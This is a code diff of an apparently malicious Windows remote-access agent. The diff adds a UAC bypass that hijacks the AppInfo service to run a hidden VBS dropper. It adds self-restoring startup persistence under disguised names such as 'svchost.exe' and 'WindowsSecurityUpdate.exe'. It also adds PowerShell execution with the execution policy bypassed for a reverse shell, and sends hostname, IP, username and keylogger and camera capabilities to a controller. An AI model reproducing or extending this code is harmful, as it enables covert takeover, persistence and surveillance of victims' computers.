@@ -13,7 +13,13 @@ UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
 def debug_print(msg):
     """Print debug messages directly (bypasses all logging systems)"""
     if UAC_DEBUG:
-        print(f"[DEBUG] {msg}", flush=True)
+        # Fix encoding issues - replace emojis with ASCII for Windows console
+        msg = str(msg).replace('✅', '[OK]').replace('❌', '[X]').replace('⚠️', '[!]')
+        try:
+            print(f"[DEBUG] {msg}", flush=True)
+        except UnicodeEncodeError:
+            # Fallback: encode to ASCII, ignore unicode errors
+            print(f"[DEBUG] {msg.encode('ascii', 'ignore').decode('ascii')}", flush=True)
 
 debug_print("=" * 80)
 debug_print("PYTHON AGENT STARTUP - UAC PRIVILEGE DEBUGGER ENABLED")
@@ -22,58 +28,60 @@ debug_print(f"Python version: {sys.version}")
 debug_print(f"Platform: {sys.platform}")
 debug_print("=" * 80)
 
-# Step 1: Import eventlet and patch IMMEDIATELY
+# Step 1: Import eventlet and patch IMMEDIATELY (OPTIONAL)
 debug_print("Step 1: Importing eventlet...")
+EVENTLET_AVAILABLE = False
 try:
     import eventlet
     debug_print("✅ eventlet imported successfully")
+    EVENTLET_AVAILABLE = True
 except ImportError as e:
-    debug_print(f"❌ eventlet import FAILED: {e}")
-    debug_print("Installing eventlet: pip install eventlet")
-    sys.exit(1)
+    debug_print(f"⚠️ eventlet import FAILED: {e}")
+    debug_print("⚠️ Continuing WITHOUT eventlet (some async features may not work)")
+    debug_print("⚠️ To enable eventlet: pip install eventlet")
+    eventlet = None  # Set to None for later checks
 
-debug_print("Step 2: Running eventlet.monkey_patch()...")
-try:
-    # CRITICAL: Suppress the RLock warning by redirecting stderr temporarily
-    import io as _io
-    old_stderr = sys.stderr
-    sys.stderr = _io.StringIO()  # Capture stderr
-    
-    # Patch threading BEFORE any other imports!
-    eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
-    
-    # Restore stderr
-    captured_stderr = sys.stderr.getvalue()
-    sys.stderr = old_stderr
-    
-    # Check if there was an RLock warning
-    if "RLock" in captured_stderr:
-        debug_print("⚠️ RLock warning detected (Python created locks before eventlet patch)")
-        debug_print("   This is EXPECTED and can be ignored - eventlet will patch future locks")
-    
-    debug_print("✅ eventlet.monkey_patch() SUCCESS!")
-    debug_print("   - all=True")
-    debug_print("   - thread=True (threading patched)")
-    debug_print("   - time=True")
-    debug_print("   - socket=True")
-    debug_print("   - select=True")
-    EVENTLET_PATCHED = True
-except Exception as e:
-    # Restore stderr if exception occurred
+if EVENTLET_AVAILABLE:
+    debug_print("Step 2: Running eventlet.monkey_patch()...")
     try:
+        # CRITICAL: Suppress the RLock warning by redirecting stderr temporarily
+        import io as _io
+        old_stderr = sys.stderr
+        sys.stderr = _io.StringIO()  # Capture stderr
+        
+        # Patch threading BEFORE any other imports!
+        eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
+        
+        # Restore stderr
+        captured_stderr = sys.stderr.getvalue()
         sys.stderr = old_stderr
-    except:
-        pass
-    
-    debug_print(f"❌ eventlet.monkey_patch() FAILED: {e}")
-    debug_print("Trying basic monkey_patch()...")
-    try:
-        eventlet.monkey_patch()
-        debug_print("✅ Basic monkey_patch() SUCCESS!")
+        
+        # Check if there was an RLock warning
+        if "RLock" in captured_stderr:
+            debug_print("⚠️ RLock warning detected (Python created locks before eventlet patch)")
+            debug_print("   This is EXPECTED and can be ignored - eventlet will patch future locks")
+        
+        debug_print("✅ eventlet.monkey_patch() SUCCESS!")
+        debug_print("   - all=True")
+        debug_print("   - thread=True (threading patched)")
+        debug_print("   - time=True")
+        debug_print("   - socket=True")
+        debug_print("   - select=True")
         EVENTLET_PATCHED = True
-    except Exception as e2:
-        debug_print(f"❌ Basic monkey_patch() FAILED: {e2}")
+    except Exception as e:
+        # Restore stderr if exception occurred
+        try:
+            sys.stderr = old_stderr
+        except:
+            pass
+        
+        debug_print(f"⚠️ eventlet.monkey_patch() FAILED: {e}")
+        debug_print("⚠️ Continuing without monkey patching")
         EVENTLET_PATCHED = False
+        EVENTLET_AVAILABLE = False
+else:
+    debug_print("Step 2: Skipping eventlet.monkey_patch() (eventlet not available)")
+    EVENTLET_PATCHED = False
 
 debug_print("Step 3: Testing threading after monkey_patch()...")
 try:
@@ -85,7 +93,10 @@ except Exception as e:
     debug_print(f"❌ threading.RLock() test FAILED: {e}")
 
 debug_print("=" * 80)
-debug_print("EVENTLET SETUP COMPLETE - NOW IMPORTING OTHER MODULES")
+if EVENTLET_AVAILABLE:
+    debug_print("EVENTLET SETUP COMPLETE - NOW IMPORTING OTHER MODULES")
+else:
+    debug_print("EVENTLET SKIPPED - CONTINUING WITHOUT IT")
 debug_print("=" * 80)
 
 # Suppress warnings AFTER eventlet patch
@@ -764,6 +775,16 @@ CHUNK = 1024
 # FORMAT already defined above based on pyaudio availability
 CHANNELS = 1
 RATE = 44100
+
+# Connection Health Monitor
+CONNECTION_STATE = {
+    'connected': False,
+    'last_successful_emit': 0,
+    'last_check': 0,
+    'reconnect_needed': False,
+    'consecutive_failures': 0,
+    'force_reconnect': False
+}
 
 # WebRTC streaming variables
 WEBRTC_ENABLED = False
@@ -2050,9 +2071,30 @@ def attempt_uac_bypass():
     
     if result:
         debug_print("=" * 80)
-        debug_print("✅✅✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+        debug_print("✅ [UAC BYPASS] Elevated instance launched successfully!")
+        debug_print("✅ [UAC BYPASS] Checking if THIS process gained admin...")
         debug_print("=" * 80)
-        log_message("✅ [UAC BYPASS] UAC bypass successful via UAC Manager!", "success")
+        
+        # Important: UAC bypass launches a NEW elevated instance
+        # We need to check if THIS current process is now admin
+        time.sleep(2)  # Give the elevated instance time to start
+        
+        if is_admin():
+            # Somehow THIS process became admin (unusual but possible)
+            debug_print("✅ [UAC BYPASS] THIS process is now admin!")
+            log_message("✅ [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
+            return True
+        else:
+            # A separate elevated instance was launched
+            # This current process is still NOT admin
+            debug_print("⚠️ [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin")
+            debug_print("⚠️ [UAC BYPASS] THIS instance should EXIT to avoid duplicates")
+            debug_print("⚠️ [UAC BYPASS] The elevated instance will take over")
+            log_message("⚠️ [UAC BYPASS] Elevated instance launched - exiting current instance", "warning")
+            
+            # Exit this non-admin instance to prevent duplicates
+            time.sleep(2)  # Give elevated instance time to fully start
+            sys.exit(0)  # Exit old instance, let elevated instance take over
     else:
         debug_print("=" * 80)
         debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
@@ -2435,7 +2477,7 @@ def bypass_uac_junction_method():
         # Use mklink to create junction (requires admin, so this is simplified)
         try:
             subprocess.run([
-                'cmd', '/c', 'mklink', '/J', 
+                'powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', 'mklink', '/J', 
                 os.path.join(temp_dir, "fake_system32"),
                 junction_dir
             ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
@@ -2764,27 +2806,47 @@ def bypass_uac_wsreset():
         return False
 
 def bypass_uac_appinfo_service():
-    """UAC bypass using AppInfo service manipulation (UACME Method 61)."""
+    """UAC bypass using AppInfo service manipulation (UACME Method 61) - VBS Edition."""
     if not WINDOWS_AVAILABLE:
         return False
     
     try:
         # This method involves manipulating the Application Information service
         # to bypass UAC by modifying service permissions
+        # ENHANCED: Uses VBS instead of CMD for stealth
         
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
             current_exe = f'python.exe "{current_exe}"'
         
-        # Method 1: Try to modify AppInfo service configuration
+        # Create VBS script for stealthy execution
+        vbs_script = f'''
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "{current_exe}", 0, False
+Set objShell = Nothing
+'''
+        
+        # Save VBS to temp directory
+        import tempfile
+        vbs_path = os.path.join(tempfile.gettempdir(), "sysupdate.vbs")
+        
+        try:
+            with open(vbs_path, 'w') as f:
+                f.write(vbs_script)
+        except Exception as e:
+            log_message(f"Failed to create VBS script: {e}")
+            return False
+        
+        # Method 1: Try to modify AppInfo service configuration with VBS
         try:
             # Stop AppInfo service temporarily
             subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
             
-            # Modify service binary path to include our payload
+            # Modify service binary path to use VBS instead of CMD
+            # VBS runs silently without console window - much stealthier!
             subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
-                          f'cmd.exe /c {current_exe} && svchost.exe -k netsvcs -p'], 
+                          f'wscript.exe //B //Nologo "{vbs_path}" && svchost.exe -k netsvcs -p'], 
                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
             
             # Start service
@@ -2798,9 +2860,20 @@ def bypass_uac_appinfo_service():
                           r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
             
+            # Cleanup VBS file
+            try:
+                os.remove(vbs_path)
+            except:
+                pass
+            
             return True
             
-        except:
+        except Exception as e:
+            # Cleanup VBS file on error
+            try:
+                os.remove(vbs_path)
+            except:
+                pass
             return False
             
     except Exception as e:
@@ -2969,6 +3042,7 @@ def establish_persistence():
     persistence_methods = [
         registry_run_key_persistence,
         startup_folder_persistence,
+        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy
         scheduled_task_persistence,
         service_persistence,
         # Advanced persistence methods
@@ -3363,7 +3437,7 @@ goto loop
         #     f.write(watchdog_batch)
         # 
         # # Start watchdog
-        # subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
+        # subprocess.Popen(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-File', watchdog_path], 
         #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
         log_message(f"[SKIP] Watchdog batch persistence disabled to prevent popup windows")
@@ -3371,6 +3445,112 @@ goto loop
         
     except Exception as e:
         log_message(f"Watchdog persistence failed: {e}")
+        return False
+
+def startup_folder_watchdog_persistence():
+    """
+    Deploy original .exe to AppData and create monitored duplicate in startup folder.
+    - Original exe → AppData (hidden, protected location)
+    - Startup copy → shell:startup (auto-recreated if deleted)
+    - Background thread monitors and restores startup copy
+    """
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Check if running as compiled executable
+        if not (hasattr(sys, 'frozen') and sys.frozen):
+            log_message("[STARTUP WATCHDOG] Only works with compiled .exe, skipping")
+            return False
+        
+        import shutil
+        
+        # Paths
+        current_exe = sys.executable  # Current executable path
+        appdata_folder = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows')
+        appdata_exe = os.path.join(appdata_folder, 'svchost.exe')
+        startup_folder = os.path.join(os.environ.get('APPDATA', ''), 
+                                      'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        startup_exe = os.path.join(startup_folder, 'WindowsSecurityUpdate.exe')
+        
+        # Create directories if they don't exist
+        os.makedirs(appdata_folder, exist_ok=True)
+        os.makedirs(startup_folder, exist_ok=True)
+        
+        # Step 1: Deploy original to AppData (if not already there)
+        if current_exe != appdata_exe:
+            if not os.path.exists(appdata_exe):
+                shutil.copy2(current_exe, appdata_exe)
+                log_message(f"[STARTUP WATCHDOG] Deployed original to AppData: {appdata_exe}")
+                
+                # Hide the AppData exe
+                try:
+                    subprocess.run(['attrib', '+h', '+s', appdata_exe], 
+                                 creationflags=subprocess.CREATE_NO_WINDOW, 
+                                 capture_output=True, timeout=5)
+                    log_message("[STARTUP WATCHDOG] Hidden AppData exe with +h +s attributes")
+                except:
+                    pass
+        
+        # Step 2: Create duplicate in startup folder
+        if not os.path.exists(startup_exe):
+            shutil.copy2(appdata_exe, startup_exe)
+            log_message(f"[STARTUP WATCHDOG] Created startup folder copy: {startup_exe}")
+        
+        # Step 3: Start watchdog thread to monitor startup folder
+        def startup_watchdog_thread():
+            """Background thread that monitors and restores startup folder copy"""
+            log_message("[STARTUP WATCHDOG] Monitoring thread started")
+            
+            while True:
+                try:
+                    # Check if startup copy exists
+                    if not os.path.exists(startup_exe):
+                        log_message("[STARTUP WATCHDOG] ⚠️ Startup copy DELETED! Restoring...")
+                        
+                        # Restore from AppData original
+                        if os.path.exists(appdata_exe):
+                            shutil.copy2(appdata_exe, startup_exe)
+                            log_message(f"[STARTUP WATCHDOG] ✅ Restored: {startup_exe}")
+                        else:
+                            log_message("[STARTUP WATCHDOG] ❌ AppData original missing! Cannot restore!")
+                    
+                    # Check if AppData original exists
+                    if not os.path.exists(appdata_exe):
+                        log_message("[STARTUP WATCHDOG] ⚠️ AppData original DELETED! Restoring...")
+                        
+                        # Restore from startup copy
+                        if os.path.exists(startup_exe):
+                            shutil.copy2(startup_exe, appdata_exe)
+                            # Re-hide it
+                            try:
+                                subprocess.run(['attrib', '+h', '+s', appdata_exe], 
+                                             creationflags=subprocess.CREATE_NO_WINDOW, 
+                                             capture_output=True, timeout=5)
+                            except:
+                                pass
+                            log_message(f"[STARTUP WATCHDOG] ✅ Restored AppData: {appdata_exe}")
+                        elif os.path.exists(current_exe):
+                            # Last resort: copy from current location
+                            shutil.copy2(current_exe, appdata_exe)
+                            log_message("[STARTUP WATCHDOG] ✅ Restored AppData from current exe")
+                    
+                    # Sleep for 10 seconds before next check
+                    time.sleep(10)
+                    
+                except Exception as e:
+                    log_message(f"[STARTUP WATCHDOG] Monitor error: {e}")
+                    time.sleep(30)  # Wait longer on error
+        
+        # Start watchdog thread (daemon so it doesn't prevent exit)
+        watchdog_thread = threading.Thread(target=startup_watchdog_thread, daemon=True)
+        watchdog_thread.start()
+        log_message("[STARTUP WATCHDOG] ✅ Persistence established with auto-restore")
+        
+        return True
+        
+    except Exception as e:
+        log_message(f"[STARTUP WATCHDOG] Setup failed: {e}")
         return False
 
 def tamper_protection_persistence():
@@ -4637,10 +4817,10 @@ def disable_wsl_routing():
         
         # Method 3: Force CMD.exe as default shell (AGGRESSIVE!)
         try:
-            # Set ComSpec to force CMD.exe
-            cmd_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
-            os.environ['COMSPEC'] = cmd_path
-            log_message(f"[WSL] Forced COMSPEC to: {cmd_path}")
+            # Set ComSpec to force PowerShell
+            ps_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+            os.environ['COMSPEC'] = ps_path
+            log_message(f"[WSL] Forced COMSPEC to: {ps_path}")
         except Exception as e:
             log_message(f"[WSL] Failed to set COMSPEC: {e}")
         
@@ -5324,10 +5504,17 @@ def run_as_admin():
         log_message("[!] Relaunching as Administrator...")
         try:
             # Relaunch with elevated privileges
-            ctypes.windll.shell32.ShellExecuteW(
+            result = ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", sys.executable, f'"{__file__}"', None, 1
             )
-            sys.exit()
+            # ShellExecuteW returns > 32 on success
+            if result > 32:
+                log_message("[!] Elevated instance launched successfully - original instance will exit")
+                time.sleep(2)  # Give elevated instance time to start
+                sys.exit(0)
+            else:
+                log_message(f"[!] User declined elevation or launch failed (code: {result})")
+                return False
         except (AttributeError, OSError):
             log_message("[!] Failed to relaunch as admin: Windows API not available")
             return False
@@ -5552,6 +5739,326 @@ LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
 # Note: Audio constants are defined globally above
+
+# ============================================================================
+# PowerShell Terminal Formatting for UI v2.1
+# ============================================================================
+
+def get_powershell_prompt():
+    """Get PowerShell-style prompt with current directory."""
+    try:
+        cwd = os.getcwd()
+        # PowerShell shows full path
+        return f"PS {cwd}>"
+    except:
+        return "PS C:\\>"
+
+def get_powershell_version():
+    """Get PowerShell version information."""
+    try:
+        if platform.system() == "Windows":
+            ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+            result = subprocess.run(
+                [ps_exe, "-NoProfile", "-Command", "$PSVersionTable.PSVersion.ToString()"],
+                capture_output=True,
+                text=True,
+                timeout=5,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            return result.stdout.strip() or "5.1"
+    except:
+        pass
+    return "5.1"
+
+def format_powershell_output(command, stdout, stderr="", exit_code=0, execution_time=0):
+    """
+    Format command output to look EXACTLY like PowerShell terminal.
+    
+    Returns a dict with PowerShell-specific formatting for UI v2.1:
+    - prompt: PowerShell prompt string
+    - command: The command that was executed
+    - output: Command output
+    - error: Error output (if any)
+    - exit_code: Command exit code
+    - cwd: Current working directory
+    - execution_time: Command execution time in ms
+    - terminal_type: 'powershell'
+    - ps_version: PowerShell version
+    """
+    prompt = get_powershell_prompt()
+    
+    # Format output exactly like PowerShell
+    formatted_output = {
+        'terminal_type': 'powershell',
+        'prompt': prompt,
+        'command': command,
+        'output': stdout if stdout else '',  # Keep original formatting
+        'error': stderr if stderr else '',    # Keep original formatting
+        'exit_code': exit_code,
+        'cwd': os.getcwd() if hasattr(os, 'getcwd') else 'C:\\',
+        'execution_time': execution_time,
+        'ps_version': get_powershell_version(),
+        'timestamp': int(time.time() * 1000),
+        'formatted_text': build_powershell_text(prompt, command, stdout, stderr, exit_code)
+    }
+    
+    return formatted_output
+
+def build_powershell_text(prompt, command, stdout, stderr, exit_code):
+    """Build the actual text output that looks EXACTLY like PowerShell."""
+    # Start with prompt + command
+    result = f"{prompt} {command}\n"
+    
+    # Add output (preserve all whitespace/formatting from PowerShell)
+    if stdout:
+        # Don't strip - preserve exact PowerShell output
+        result += stdout
+        # Ensure there's a newline after output if not already present
+        if not stdout.endswith('\n'):
+            result += '\n'
+    
+    # Add error output if present
+    if stderr and stderr.strip():
+        if not result.endswith('\n'):
+            result += '\n'
+        result += stderr
+        if not stderr.endswith('\n'):
+            result += '\n'
+    
+    # Add exit code if non-zero
+    if exit_code != 0:
+        if not result.endswith('\n'):
+            result += '\n'
+        result += f"Exit code: {exit_code}\n"
+    
+    # Add trailing prompt (ready for next command)
+    result += f"{prompt} "
+    
+    return result
+
+def execute_in_powershell(command, timeout=30):
+    """
+    Execute command in PowerShell and return formatted output.
+    This is used by execute_command() to ensure all commands use PowerShell.
+    """
+    import time as time_module
+    start_time = time_module.time()
+    
+    try:
+        if platform.system() == "Windows":
+            ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
+                                      'WindowsPowerShell', 'v1.0', 'powershell.exe')
+            
+            # PowerShell execution with proper formatting
+            # Use Out-String -Width 200 to preserve formatting
+            formatted_command = f"{command} | Out-String -Width 200"
+            
+            result = subprocess.run(
+                [ps_exe_path, "-NoProfile", "-NonInteractive", "-Command", formatted_command],
+                capture_output=True,
+                text=False,
+                timeout=timeout,
+                creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0,
+                env=os.environ.copy()
+            )
+            
+            # Decode output
+            try:
+                stdout = result.stdout.decode('utf-8', errors='replace')
+                stderr = result.stderr.decode('utf-8', errors='replace')
+            except:
+                import locale
+                encoding = locale.getpreferredencoding() or 'cp437'
+                stdout = result.stdout.decode(encoding, errors='replace')
+                stderr = result.stderr.decode(encoding, errors='replace')
+            
+            execution_time = int((time_module.time() - start_time) * 1000)
+            
+            return format_powershell_output(
+                command=command,
+                stdout=stdout,
+                stderr=stderr,
+                exit_code=result.returncode,
+                execution_time=execution_time
+            )
+        else:
+            # For non-Windows, use bash but format similarly
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=timeout
+            )
+            
+            execution_time = int((time_module.time() - start_time) * 1000)
+            
+            # Return similar format but with bash indicator
+            return {
+                'terminal_type': 'bash',
+                'prompt': f"{os.getenv('USER')}@{socket.gethostname()}:~$",
+                'command': command,
+                'output': result.stdout.strip(),
+                'error': result.stderr.strip(),
+                'exit_code': result.returncode,
+                'cwd': os.getcwd(),
+                'execution_time': execution_time,
+                'timestamp': int(time_module.time() * 1000),
+                'formatted_text': f"$ {command}\n{result.stdout.strip()}"
+            }
+            
+    except subprocess.TimeoutExpired:
+        execution_time = int((time_module.time() - start_time) * 1000)
+        return format_powershell_output(
+            command=command,
+            stdout='',
+            stderr=f'Command timed out after {timeout} seconds',
+            exit_code=1,
+            execution_time=execution_time
+        )
+    except Exception as e:
+        execution_time = int((time_module.time() - start_time) * 1000)
+        return format_powershell_output(
+            command=command,
+            stdout='',
+            stderr=f'Execution error: {str(e)}',
+            exit_code=1,
+            execution_time=execution_time
+        )
+
+# ============================================================================
+# End PowerShell Terminal Formatting
+# ============================================================================
+
+# ============================================================================
+# Connection Health Monitor & Auto-Reconnect
+# ============================================================================
+
+def stop_all_operations():
+    """Stop all active operations (streams, commands, etc.)"""
+    log_message("[CLEANUP] Stopping all active operations...")
+    
+    # Stop screen streaming
+    try:
+        global STREAMING_ENABLED
+        if STREAMING_ENABLED:
+            stop_streaming()
+            log_message("[CLEANUP] Screen streaming stopped")
+    except Exception as e:
+        log_message(f"[CLEANUP] Error stopping screen stream: {e}")
+    
+    # Stop camera streaming
+    try:
+        global CAMERA_STREAMING_ENABLED
+        if CAMERA_STREAMING_ENABLED:
+            stop_camera_streaming()
+            log_message("[CLEANUP] Camera streaming stopped")
+    except Exception as e:
+        log_message(f"[CLEANUP] Error stopping camera stream: {e}")
+    
+    # Stop audio streaming
+    try:
+        global AUDIO_STREAMING_ENABLED
+        if AUDIO_STREAMING_ENABLED:
+            stop_audio_streaming()
+            log_message("[CLEANUP] Audio streaming stopped")
+    except Exception as e:
+        log_message(f"[CLEANUP] Error stopping audio stream: {e}")
+    
+    log_message("[CLEANUP] All operations stopped")
+
+def connection_health_monitor():
+    """
+    Monitor connection health every second.
+    If connection is lost:
+    1. Stop all streaming
+    2. Force reconnect
+    3. Clear pending operations
+    """
+    global CONNECTION_STATE
+    
+    log_message("[HEALTH_MONITOR] Connection health monitor started")
+    
+    while True:
+        try:
+            time.sleep(1)  # Check every second
+            
+            current_time = time.time()
+            CONNECTION_STATE['last_check'] = current_time
+            
+            # Check if Socket.IO is connected
+            is_connected = sio is not None and hasattr(sio, 'connected') and sio.connected
+            
+            # Connection state changed
+            if is_connected != CONNECTION_STATE['connected']:
+                if is_connected:
+                    # Just connected/reconnected
+                    log_message("[HEALTH_MONITOR] ✅ Connection ACTIVE")
+                    CONNECTION_STATE['connected'] = True
+                    CONNECTION_STATE['consecutive_failures'] = 0
+                    CONNECTION_STATE['reconnect_needed'] = False
+                    CONNECTION_STATE['force_reconnect'] = False
+                else:
+                    # Just disconnected
+                    log_message("[HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...")
+                    CONNECTION_STATE['connected'] = False
+                    CONNECTION_STATE['consecutive_failures'] += 1
+                    
+                    # Stop all active streaming immediately
+                    try:
+                        stop_all_operations()
+                    except Exception as e:
+                        log_message(f"[HEALTH_MONITOR] Error during cleanup: {e}")
+                    
+                    # Flag for forced reconnection
+                    CONNECTION_STATE['reconnect_needed'] = True
+                    log_message("[HEALTH_MONITOR] Triggering forced reconnection...")
+            
+            # If not connected for more than 5 seconds, force disconnect and reconnect
+            if not is_connected and CONNECTION_STATE['consecutive_failures'] > 5:
+                log_message("[HEALTH_MONITOR] ⚠️ Connection dead for 5+ seconds - forcing reconnect")
+                CONNECTION_STATE['force_reconnect'] = True
+                try:
+                    if sio is not None and hasattr(sio, 'disconnect'):
+                        sio.disconnect()
+                        log_message("[HEALTH_MONITOR] Forced disconnect to trigger clean reconnect")
+                except Exception as e:
+                    log_message(f"[HEALTH_MONITOR] Error forcing disconnect: {e}")
+                CONNECTION_STATE['consecutive_failures'] = 0
+                
+        except KeyboardInterrupt:
+            log_message("[HEALTH_MONITOR] Health monitor stopped by interrupt")
+            break
+        except Exception as e:
+            log_message(f"[HEALTH_MONITOR] Monitor error: {e}")
+            time.sleep(1)
+
+# ============================================================================
+# End Connection Health Monitor
+# ============================================================================
+
+def get_local_ip():
+    """Get local IP address."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return '127.0.0.1'
+
+def get_public_ip():
+    """Get public IP address."""
+    try:
+        if REQUESTS_AVAILABLE:
+            import requests
+            response = requests.get('https://api.ipify.org?format=json', timeout=3)
+            return response.json()['ip']
+    except:
+        pass
+    return 'unknown'
 
 def get_or_create_agent_id():
     """
@@ -7481,7 +7988,7 @@ def reverse_shell_handler(agent_id):
                             else:
                                 # Use CMD.exe with proper encoding
                                 result = subprocess.run(
-                                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],
+                                    [ps_exe_path, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],
                                     capture_output=True,
                                     text=False,  # Get bytes for proper encoding
                                     timeout=30,
@@ -8198,9 +8705,58 @@ def register_socketio_handlers():
     # Register connection handler
     @sio.event
     def connect():
+        global CONNECTION_STATE
         agent_id = get_or_create_agent_id()
-        log_message(f"Connected to controller, registering agent {agent_id}")
-        safe_emit('agent_connect', {'agent_id': agent_id})  # ✅ SAFE
+        log_message(f"[CONNECT] Connected to controller, registering agent {agent_id}")
+        
+        # Update connection state
+        CONNECTION_STATE['connected'] = True
+        CONNECTION_STATE['consecutive_failures'] = 0
+        CONNECTION_STATE['reconnect_needed'] = False
+        
+        safe_emit('agent_connect', {
+        'agent_id': agent_id,
+        'hostname': socket.gethostname(),
+        'platform': platform.system(),
+        'os_version': platform.release(),
+        'ip_address': get_local_ip(),
+        'public_ip': get_public_ip(),
+        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+        'version': '2.1',
+        'capabilities': {
+            'screen': True,
+            'camera': CV2_AVAILABLE,
+            'audio': PYAUDIO_AVAILABLE,
+            'keylogger': PYNPUT_AVAILABLE,
+            'clipboard': True,
+            'file_manager': True,
+            'process_manager': PSUTIL_AVAILABLE,
+            'webcam': CV2_AVAILABLE,
+            'webrtc': AIORTC_AVAILABLE
+        },
+        'timestamp': int(time.time() * 1000)
+    })  # ✅ SAFE
+    
+    # Register disconnect handler
+    @sio.event
+    def disconnect():
+        global CONNECTION_STATE
+        agent_id = get_or_create_agent_id()
+        log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
+        
+        # Update connection state immediately
+        CONNECTION_STATE['connected'] = False
+        CONNECTION_STATE['reconnect_needed'] = True
+        
+        log_message("[DISCONNECT] Stopping all active streams and commands...")
+        
+        # Stop all operations
+        try:
+            stop_all_operations()
+        except Exception as e:
+            log_message(f"[DISCONNECT] Error during cleanup: {e}")
+        
+        log_message("[DISCONNECT] Cleanup complete - will auto-reconnect")
     
     # Register file transfer handlers
     sio.on('file_chunk_from_operator')(on_file_chunk_from_operator)
@@ -8643,9 +9199,14 @@ def format_command_output(output):
     return formatted
 
 def execute_command(command):
-    """Execute a command and return its output - SMART AUTO-DETECTION with PRESERVED FORMATTING"""
+    """Execute a command in PowerShell and return formatted output for UI v2.1"""
+    # Use the new PowerShell formatting for UI v2.1
+    return execute_in_powershell(command)
+    
+def execute_command_legacy(command):
+    """Legacy execute command function (kept for reference)"""
     try:
-        log_message(f"[CMD] Executing: {command}", "info")
+        log_message(f"[PS] Executing: {command}", "info")
         
         # Check for incomplete/interactive commands
         interactive_commands = {
@@ -8661,7 +9222,7 @@ def execute_command(command):
         cmd_lower = command.strip().lower()
         if cmd_lower in interactive_commands:
             help_msg = f"ℹ️ '{command}' requires arguments.\n\nSuggested commands:\n{interactive_commands[cmd_lower]}\n\nTip: Type the full command on one line (e.g., 'netsh wlan show profile')"
-            log_message(f"[CMD] Interactive command detected: {command}", "info")
+            log_message(f"[PS] Interactive command detected: {command}", "info")
             return help_msg
         
         if platform.system() == "Windows":
@@ -8703,7 +9264,7 @@ def execute_command(command):
                     command = f"{translated} {' '.join(cmd_parts[1:])}"
                 else:
                     command = translated
-                log_message(f"[CMD] Auto-translated: '{original_command}' → '{command}'", "info")
+                log_message(f"[PS] Auto-translated: '{original_command}' → '{command}'", "info")
             
             # PowerShell cmdlet detection
             powershell_keywords = [
@@ -8726,7 +9287,7 @@ def execute_command(command):
             
             if use_powershell:
                 # Use PowerShell for PowerShell-specific commands
-                log_message(f"[CMD] Using PowerShell: {ps_exe_path}", "debug")
+                log_message(f"[PS] Using PowerShell: {ps_exe_path}", "debug")
                 
                 # PowerShell with proper output formatting
                 # Add Out-String -Width 200 to preserve formatting
@@ -8762,11 +9323,11 @@ def execute_command(command):
                 
             else:
                 # Use CMD.exe for standard/translated commands
-                log_message(f"[CMD] Using CMD.exe: {cmd_exe_path}", "debug")
+                log_message(f"[PS] Using CMD.exe: {cmd_exe_path}", "debug")
                 
                 # For CMD, capture bytes first for proper encoding
                 result = subprocess.run(
-                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],  # Force UTF-8 output
+                    [ps_exe_path, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],  # Force UTF-8 output
                     capture_output=True,
                     text=False,  # Get bytes first
                     timeout=30,
@@ -8813,7 +9374,7 @@ def execute_command(command):
         if not output or output.strip() == "":
             output = "[No output from command]"
         
-        log_message(f"[CMD] Output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
+        log_message(f"[PS] Output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
         return output
         
     except subprocess.TimeoutExpired:
@@ -11370,7 +11931,28 @@ def connect():
     # Connection message
     log_message(f"Connected to server. Registering with agent_id: {agent_id}")
     
-    safe_emit('agent_connect', {'agent_id': agent_id})
+    safe_emit('agent_connect', {
+        'agent_id': agent_id,
+        'hostname': socket.gethostname(),
+        'platform': platform.system(),
+        'os_version': platform.release(),
+        'ip_address': get_local_ip(),
